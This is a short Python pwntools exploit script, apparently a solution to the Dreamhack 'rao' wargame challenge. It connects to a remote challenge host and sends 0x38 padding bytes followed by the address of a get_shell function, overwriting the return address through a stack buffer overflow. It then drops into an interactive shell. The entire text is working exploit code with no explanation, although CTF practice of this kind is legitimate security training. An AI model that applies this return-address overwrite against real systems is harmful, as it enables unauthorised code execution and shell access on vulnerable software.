from pwn import *

p = remote('host3.dreamhack.games', 23245)
e = ELF('./rao')

get_shell = e.symbols['get_shell']

buf = b'A' * 0x38 + p64(get_shell)
p.sendlineafter(b'Input: ', buf)

p.interactive()